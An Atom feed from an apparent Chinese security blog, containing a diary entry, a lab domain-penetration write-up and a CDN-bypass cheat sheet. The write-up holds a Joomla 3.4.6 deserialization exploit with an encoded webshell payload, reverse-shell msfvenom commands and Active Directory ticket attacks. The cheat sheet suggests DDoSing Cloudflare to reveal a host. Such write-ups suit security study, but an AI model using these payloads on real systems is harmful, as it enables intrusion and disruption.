<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  <subtitle>不忘初心</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2020-01-05T13:56:43.363Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomorrow</title>
    <link href="http://patrilic.top/2099/12/31/Tomorrow/"/>
    <id>http://patrilic.top/2099/12/31/Tomorrow/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2020-01-05T13:56:43.363Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="写给自己"><a href="#写给自己" class="headerlink" title="写给自己"></a>写给自己</h5><hr><blockquote><p>Tomorrow is not just another day in your life<br>It’s the next day in an ‘it does matter’ life</p></blockquote><hr><p>其实呢，一直想把博客变成一个只属于自己的小块空间，自己想怎么装饰就怎么装饰，想写什么就写什么，甚至之前有段时间只用<code>hexo s</code>233333</p><p>现在觉得呢，还是一样，不用在意别人的眼光，自己做干什么就做什么，慢慢把自己想好好写的东西放在博客上，等以后年纪上去了，也算是有个纪念～</p><p>以后这里我打算写一点自己从生活中经历的事情得到的感悟或者一些有趣的事情吧，本身也不是想搞成纯技术博客的 😁</p><blockquote><pre><code>-- 2019.8.28 早 3点56分</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>还有几天就要正式进入大三的生活了，课还行，主要是感觉可能这辈子的学生生涯也快到头了..</p><p>最近经历很多事情，也看开了，好好学习，好好生活。</p><p>劝诸君： 身体健康才是第一位 ，哎 共勉吧</p><p>明天加油</p><blockquote><p>Just fxxking do it dig fucking deep and get it done</p></blockquote><h5 id="2019-8-30"><a href="#2019-8-30" class="headerlink" title="2019.8.30"></a>2019.8.30</h5><p>好像今天要开学了，早点休息吧～</p><blockquote><p>Get raw and get intense</p></blockquote><h5 id="2019-9-9"><a href="#2019-9-9" class="headerlink" title="2019.9.9"></a>2019.9.9</h5><p>差距啊..太菜了，还有什么理由不努力的吗？</p><blockquote><p>微光</p></blockquote><h5 id="2019-9-15"><a href="#2019-9-15" class="headerlink" title="2019.9.15"></a>2019.9.15</h5><blockquote><p>一切有为法 如梦幻泡影<br>如露亦如电 应作如是观</p></blockquote><h5 id="2020-1-5"><a href="#2020-1-5" class="headerlink" title="2020.1.5"></a>2020.1.5</h5><p>UNC路径不能访问外网服务器的原因: 经过路由不一定都开放135,137,139,445</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/wallpaper/thumb-1920-485164.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h5 id=&quot;写给自己&quot;&gt;&lt;a href=&quot;#写给自己&quot; class=&quot;headerlink&quot; title=&quot;写给自己&quot;&gt;&lt;/a&gt;写给自己&lt;/h5&gt;&lt;hr&gt;
&lt;blo
      
    
    </summary>
    
      <category term="Diary" scheme="http://patrilic.top/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>iSoonLab.org Write-up</title>
    <link href="http://patrilic.top/2019/12/12/iSoonLab.org%20Write-up/"/>
    <id>http://patrilic.top/2019/12/12/iSoonLab.org Write-up/</id>
    <published>2019-12-12T06:32:22.000Z</published>
    <updated>2019-12-12T07:26:41.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-12-12 14:32:22<br><img src="/wallpaper/[30125]16347313.jpg" alt></p></blockquote><h2 id="题目拓扑"><a href="#题目拓扑" class="headerlink" title="题目拓扑"></a>题目拓扑</h2><p>Linux1 - solr: 192.168.21.12</p><p>Linux2 - joomla!: 192.168.21.20</p><p>Backup.sub.iSoonLab.org: 192.168.21.8</p><p>subdc.sub.iSoonLab.org: 192.168.21.4  /  10.153.69.50</p><p>DC.iSoonLab.org: 10.153.69.5</p><p><img src="/iSoonLab.org Write-up/image-20191201130447779.png" alt="image-20191201130447779"></p><h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>目标:192.168.121.131</p><p><img src="/iSoonLab.org Write-up/image-20191130235112082.png" alt="image-20191130235112082"></p><p>开放8983端口，打开是solr未授权，8.1.1版本，联想到前段时间很火的Apache Solr RCE</p><p><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a>    </p><p>根据网上的exp</p><p><a href="http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false" target="_blank" rel="noopener">http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false</a></p><p><img src="/iSoonLab.org Write-up/image-20191130235337378.png" alt="image-20191130235337378"></p><p>存在iSoon core</p><p><img src="/iSoonLab.org Write-up/image-20191130235734297.png" alt="image-20191130235734297"></p><p><img src="/iSoonLab.org Write-up/image-20191130235823000.png" alt="image-20191130235823000"></p><p>确实没问题，弹个shell到本机来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>因为solr用户没有/tmp目录写权限， 可以参考@haya大手子的<a href="https://forum.90sec.com/t/topic/579" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/579</a></p><p>用perl来执行脚本</p><p><img src="/iSoonLab.org Write-up/image-20191201002127259.png" alt="image-20191201002127259"></p><p>flag就在当前目录</p><p><img src="/iSoonLab.org Write-up/image-20191201002513741.png" alt="image-20191201002513741"></p><p>当然，也可以在/var/tmp里写文件～</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>简单侦查后，发现存在192.168.21.0/24网段</p><p><img src="/iSoonLab.org Write-up/image-20191201002640156.png" alt="image-20191201002640156"></p><p>使用msf自带的sock4a作代理即可，Linux1只是用来撕来流量口子</p><p>代理内网后，发现同网段存在三台机器</p><p>找到Linux2 : 192.168.21.20， 开放HTTP端口</p><p><img src="/iSoonLab.org Write-up/image-20191201003644193.png" alt="image-20191201003644193"></p><p>joomla-3.4.6版本，存在RCE，通过构造exp，拿到webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $xx;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xx = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        $obj = <span class="keyword">new</span> SimplePie;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$obj, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"system('echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash');JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $ser);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户名：</span><br><span class="line">\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line"></span><br><span class="line">密码：</span><br><span class="line">MYP<span class="string">";s:2:"</span>HS<span class="string">";O:21:"</span>JDatabaseDriverMysqli<span class="string">":4:&#123;s:5:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>xx<span class="string">";O:17:"</span>JSimplepieFactory<span class="string">":0:&#123;&#125;s:13:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>connection<span class="string">";i:1;s:21:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>disconnectHandlers<span class="string">";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"</span>SimplePie<span class="string">":3:&#123;s:8:"</span>sanitize<span class="string">";O:20:"</span>JDatabaseDriverMysql<span class="string">":0:&#123;&#125;s:19:"</span>cache_name_function<span class="string">";s:6:"</span>assert<span class="string">";s:8:"</span>feed_url<span class="string">";s:149:"</span>system(<span class="string">'echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash'</span>);JFactory::getConfig();<span class="keyword">exit</span>;<span class="string">";&#125;i:1;s:4:"</span>init<span class="string">";&#125;&#125;s:6:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>obj<span class="string">";N;&#125;</span></span><br></pre></td></tr></table></figure><p>antsword连接后，在/tmp目录上传我们生成的msf木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure><p><img src="/iSoonLab.org Write-up/image-20191201004320825.png" alt="image-20191201004320825"></p><p>拿到shell后，查看uname</p><p><img src="/iSoonLab.org Write-up/image-20191201004824374.png" alt="image-20191201004824374"></p><p>内核版本比较低的桌面版本，存在CVE-2019-13272</p><p>EXP需要满足三个条件: </p><ol><li>内核版本 &lt; 5.1.17 且为桌面版</li><li>存在/home/\<user></user></li><li>交互式shell</li></ol><p><img src="/iSoonLab.org Write-up/image-20191201005023629.png" alt="image-20191201005023629"></p><p>成功拿到第二个flag</p><h2 id="Backup-sub-iSoonLab-org"><a href="#Backup-sub-iSoonLab-org" class="headerlink" title="Backup.sub.iSoonLab.org"></a>Backup.sub.iSoonLab.org</h2><p>回过来看web界面的提示</p><p><img src="/iSoonLab.org Write-up/image-20191201005203360.png" alt="image-20191201005203360"></p><p>放出了下一步的hint，查看已经安装的软件和python第三方库</p><p><img src="/iSoonLab.org Write-up/image-20191201005355412.png" alt="image-20191201005355412"></p><p>三条思路：</p><ol><li><p>利用impacket和arpspoof进行中间人攻击</p></li><li><p>在本机上进行信息搜集，寻找到域成员机器的路子</p></li><li>系统漏洞 -&gt; ms17010 .etc </li></ol><ol><li><p>中间人攻击使用ms15-014 和 ms15-011 进行组策略劫持，拿下域成员机器</p></li><li><p>翻机器的日志</p></li><li>有day上day～ </li></ol><p>### </p><p>简单方法:</p><p>通过<code>.bash_history</code>拿到mount命令，存有明文密码， 通过<code>exploit/windows/smb/psexec</code>即可拿到目标机器NT/SYSTEM</p><p><img src="/iSoonLab.org Write-up/image-20191201013130568.png" alt="image-20191201013130568"></p><p>中间人测试也是可行的，使用MS15-011劫持组策略，只是需要等待组策略生效 (默认90分钟)</p><p>&lt;懒狗不想截图了&gt;</p><h2 id="subdc-iSoonLab-org"><a href="#subdc-iSoonLab-org" class="headerlink" title="subdc.iSoonLab.org"></a>subdc.iSoonLab.org</h2><p>在backup机子上的C:\Backup翻到了注册表的存档</p><p><img src="/iSoonLab.org Write-up/image-20191201014315000.png" alt="image-20191201014315000"></p><p>下载下来使用secretsdump进行dump</p><p><img src="/iSoonLab.org Write-up/image-20191201014547133.png" alt="image-20191201014547133"></p><p>拿到服务账户后，用来构造白银票据，攻击subdc.sub.iSoonLab.org<br>（MS14068也可）</p><p><img src="/iSoonLab.org Write-up/image-20191201015913467.png" alt="image-20191201015913467"></p><p>(注意必须关闭Linux2中的arpspoof)</p><p><img src="/iSoonLab.org Write-up/image-20191201020209077.png" alt="image-20191201020209077"></p><p>第四个flag到手～～</p><h2 id="DC-iSoonLab-org"><a href="#DC-iSoonLab-org" class="headerlink" title="DC.iSoonLab.org"></a>DC.iSoonLab.org</h2><p>最后就很简单啦，子父域中常见的双向信任，我们可以通过构造信任票据来进行攻击</p><p>利用信任票据 </p><p><a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/</a> </p><p>这里有一点小问题: 当指定krbtgt账户时，因为子父域中存在两个krbtgt账户，DCsync转储时可能爆<code>NOT_UNIQUE</code>，可以使用/all解决 </p><p>利用dcsync 转储子域的所有hash </p><p><img src="/iSoonLab.org Write-up/4624EF12-0825-4134-BFFE-AF47CF9CA4FB.png" alt="4624EF12-0825-4134-BFFE-AF47CF9CA4FB"></p><p><img src="/iSoonLab.org Write-up/04C766D7-B915-48FE-A381-3CA4DD18727D.png" alt="04C766D7-B915-48FE-A381-3CA4DD18727D"></p><p>使用/Ptt 进行信任票据传递即可</p><p><img src="/iSoonLab.org Write-up/2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382.png" alt="2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382"></p><p>拿到域控权限，flag在C:\Users\Administraotr\flag.txt中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-12-12 14:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30125]16347313.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="iSoonLab.org" scheme="http://patrilic.top/tags/iSoonLab-org/"/>
    
  </entry>
  
  <entry>
    <title>Bypass CDN 寻找真实IP</title>
    <link href="http://patrilic.top/2019/10/09/Bypass%20CDN%20%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP_1/"/>
    <id>http://patrilic.top/2019/10/09/Bypass CDN 寻找真实IP_1/</id>
    <published>2019-10-09T05:12:49.000Z</published>
    <updated>2019-10-31T15:51:16.775Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-10-09 13:12:49<br><img src="/wallpaper/futuristic.jpeg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>个人觉得，绕过CDN去寻找主机的真实ip，更容易能寻找到企业网络的薄弱地带，所以Bypass CDN也就变成了至关重要的一点</p><h2 id="0x01-常见Bypass方法"><a href="#0x01-常见Bypass方法" class="headerlink" title="0x01 常见Bypass方法"></a>0x01 常见Bypass方法</h2><h3 id="子域名搜集"><a href="#子域名搜集" class="headerlink" title="子域名搜集"></a>子域名搜集</h3><p>由于成本问题，可能某些厂商并不会将所有的子域名都部署CDN，所以如果我们能尽量的搜集子域名，或许可以找到一些没有部署CDN的子域名，拿到某些服务器的真实ip/段</p><p>然后关于子域名搜集的方式很多，就不一一介绍了，我平时主要是从这几个方面搜集子域名：</p><ol><li>SSL证书</li><li>爆破</li><li>Google Hacking</li><li>同邮箱注册人</li><li>DNS 域传送</li><li>页面JS搜集</li><li>网络空间引擎</li></ol><p>工具也有很多厉害的，平时我一般使用 OneForALL + ESD + JSfinder 来进行搜集</p><p>（ESD可以加载layer的字典，很好用）</p><h3 id="查询DNS历史解析记录"><a href="#查询DNS历史解析记录" class="headerlink" title="查询DNS历史解析记录"></a>查询DNS历史解析记录</h3><p>常常服务器在解析到CDN服务前，会解析真实ip，如果历史未删除，就可能找到<br><img src="/Bypass CDN 寻找真实IP.resources/9E7A020F-400D-4098-95A0-890D6ECF58B5.png" alt="aa49a0dae035183756bc9b7c574f7d1d"><br>常用网站：<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="http://www.17ce.com/" target="_blank" rel="noopener">http://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history" target="_blank" rel="noopener">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h3 id="MX记录（邮件探测）"><a href="#MX记录（邮件探测）" class="headerlink" title="MX记录（邮件探测）"></a>MX记录（邮件探测）</h3><p>这个很简单，如果目标系统有发件功能，通常在注册用户/找回密码等地方<img src="/Bypass CDN 寻找真实IP.resources/30801098-D5BB-4C46-83CB-DF4313C5D54E.png" alt="8aa01bd3ebc5fea8c50bfcf182df44d7"></p><h3 id="SSL证书探测"><a href="#SSL证书探测" class="headerlink" title="SSL证书探测"></a>SSL证书探测</h3><p>我们可以利用空间引擎进行SSL证书探测</p><blockquote><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p><img src="/Bypass CDN 寻找真实IP.resources/FA2E7635-76E4-43A3-B724-C782E3C08304.png" alt="cbd4dfce974be17192c5d3991bcb9ceb"><br>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>再放一个搜集证书的网站<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh</a></p><p>一个小脚本，可以快速搜集证书</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019-10-08 22:51</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: SSL_subdomain.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TIME_OUT = <span class="number">60</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_SSL</span><span class="params">(domain)</span>:</span></span><br><span class="line">    domains = []</span><br><span class="line">    url = <span class="string">'https://crt.sh/?q=%25.&#123;&#125;'</span>.format(domain)</span><br><span class="line">    response = requests.get(url,timeout=TIME_OUT)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    ssl = re.findall(<span class="string">"&lt;TD&gt;(.*?).&#123;&#125;&lt;/TD&gt;"</span>.format(domain),response.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ssl:</span><br><span class="line">        i += <span class="string">'.'</span> + domain</span><br><span class="line">        domains.append(i)</span><br><span class="line">    print(domains)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_SSL(<span class="string">"baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>还有一种方式，就是搜集SSL证书Hash，然后遍历ip去查询证书hash，如果匹配到相同的，证明这个ip就是那个 域名同根证书的服务器真实ip</p><p>简单来说，就是遍历0.0.0.0/0:443，通过ip连接https时，会显示证书</p><p>当然，也可以用censys等引擎<br><img src="/Bypass CDN 寻找真实IP.resources/82C66A85-0718-4D35-BF78-4BC6F8D66137.png" alt="88c410f42542b4d8b7387ca70ca55e68"></p><h3 id="偏远地区服务器访问"><a href="#偏远地区服务器访问" class="headerlink" title="偏远地区服务器访问"></a>偏远地区服务器访问</h3><p>在偏远地区的服务器访问时，可能不会访问到CDN节点，而是直接访问服务器真实ip</p><p>所以我们可以搞一个偏远地区的代理池，来访问目标域名，有概率就可以拿到真实ip</p><p>也就是平常说的多地Ping<br><img src="/Bypass CDN 寻找真实IP.resources/B6C9E83C-9951-4397-9929-995ABDA0F31A.png" alt="766172367254161b3f5a2d0e44e0174d"></p><h3 id="favicon-hash匹配"><a href="#favicon-hash匹配" class="headerlink" title="favicon_hash匹配"></a>favicon_hash匹配</h3><p>利用shodan的<strong>http.favicon.hash</strong>语法，来匹配icon的hash值</p><p>直接推<a href="https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py</a></p><p><a name="iWsmO"></a></p><h3 id="CloudFlare-Bypass"><a href="#CloudFlare-Bypass" class="headerlink" title="CloudFlare Bypass"></a>CloudFlare Bypass</h3><p>免费版的cf，我们可以通过DDOS来消耗对方的流量，只需要把流量打光，就会回滚到原始ip</p><p>还有利用cloudflare的改host返回示例:<br><a href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/" target="_blank" rel="noopener">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a><br>里面给了详细的介绍，我们可以通过HOST来判断是否是真实ip<br>具体看文章即可</p><p><a name="gmuNS"></a></p><h3 id="奇特的ping"><a href="#奇特的ping" class="headerlink" title="奇特的ping"></a>奇特的ping</h3><p>比如可能有些地方，使用的CDN都是以<a href="http://www.xxx.edu.cn，例如www.cuit.edu.cn,www.jwc.cuit.edu.cn" target="_blank" rel="noopener">www.xxx.edu.cn，例如www.cuit.edu.cn,www.jwc.cuit.edu.cn</a></p><p>可能去掉前缀的www，就可能绕过CDN了，猜测应该是类似于Apache VirtualHost</p><p>可参考<a href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/en/vhosts/examples.html</a></p><p>例如：<br><img src="/Bypass CDN 寻找真实IP.resources/D368AA5E-A66E-46A8-9E96-7B439AB7E059.png" alt="94f6e57f5f9c038766a278c76f46ce30"></p><p>我这里其实是ping了<a href="http://www.xxx.gov.cn和xxx.gov.cn" target="_blank" rel="noopener">www.xxx.gov.cn和xxx.gov.cn</a></p><p>这样就可以绕过CDN的检测</p><p><a name="kroXV"></a></p><h3 id="利用老域名"><a href="#利用老域名" class="headerlink" title="利用老域名"></a>利用老域名</h3><p>在换新域名时，常常将CDN部署到新的域名上，而老域名由于没过期，可能未使用CDN，然后就可以直接获取服务器真实ip。</p><p>例如patrilic.top &gt; patrilic.com<br>域名更新时，可能老域名同时解析到真实服务器，但是没有部署CDN</p><p>这个可以通过搜集域名备案的邮箱去反查，可能会有意外收获</p><h3 id="暴力匹配"><a href="#暴力匹配" class="headerlink" title="暴力匹配"></a>暴力匹配</h3><p>找到目标服务器IP段后，可以直接进行暴力匹配 ，使用masscan扫描HTTP banner，然后匹配到目标域名的相同banner</p><h3 id="DDos-社工CDN平台等"><a href="#DDos-社工CDN平台等" class="headerlink" title="DDos/社工CDN平台等"></a>DDos/社工CDN平台等</h3><h2 id="0x02-其他方法"><a href="#0x02-其他方法" class="headerlink" title="0x02 其他方法"></a>0x02 其他方法</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p><img src="/Bypass CDN 寻找真实IP.resources/6CC86789-CDCC-47CA-9940-744FBC32274E.png" alt="cd01f0e2811d6b9828927bfe6c57f8b3"></p><h3 id="ssrf，文件上传等漏洞"><a href="#ssrf，文件上传等漏洞" class="headerlink" title="ssrf，文件上传等漏洞"></a>ssrf，文件上传等漏洞</h3><p>略..</p><p><a name="gEBoP"></a></p><h2 id="0x03-参考链接🔗"><a href="#0x03-参考链接🔗" class="headerlink" title="0x03 参考链接🔗"></a>0x03 参考链接🔗</h2><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a><br><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a><br><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><a href="https://github.com/AI0TSec/blog/issues/8" target="_blank" rel="noopener">https://github.com/AI0TSec/blog/issues/8</a><br><a href="https://www.4hou.com/tools/8251.html" target="_blank" rel="noopener">https://www.4hou.com/tools/8251.html</a><br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/112583.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-10-09 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/futuristic.jpeg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Pentest Cheat Sheet" scheme="http://patrilic.top/categories/Pentest-Cheat-Sheet/"/>
    
    
      <category term="Bypass CDN" scheme="http://patrilic.top/tags/Bypass-CDN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-6145  Forcepoint VPN</title>
    <link href="http://patrilic.top/2019/09/27/CVE-2019-6145%20%20Forcepoint%20VPN/"/>
    <id>http://patrilic.top/2019/09/27/CVE-2019-6145  Forcepoint VPN/</id>
    <published>2019-09-26T16:03:55.000Z</published>
    <updated>2019-09-27T06:52:31.916Z</updated>
    
